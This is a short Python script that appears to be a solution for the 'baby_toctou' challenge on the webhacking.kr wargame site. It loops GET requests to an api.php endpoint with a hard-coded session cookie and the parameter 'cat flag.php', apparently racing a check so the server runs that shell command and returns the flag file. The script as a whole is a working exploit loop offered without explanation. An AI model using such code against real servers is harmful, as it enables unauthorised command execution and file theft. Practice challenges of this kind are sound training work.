import requests
# import hashlib
import time


URL = "http://webhacking.kr:10019/api.php"
SESSION_ID = "215o6b6hh84u927ghaev4nucdo"
cookies = {'PHPSESSID':SESSION_ID, 'baby_toctou':'670bf96758e4d790878876'}

params ={'q':'cat flag.php'}
while True:
    response = requests.get(URL, params=params, cookies=cookies)
    print(response.text)

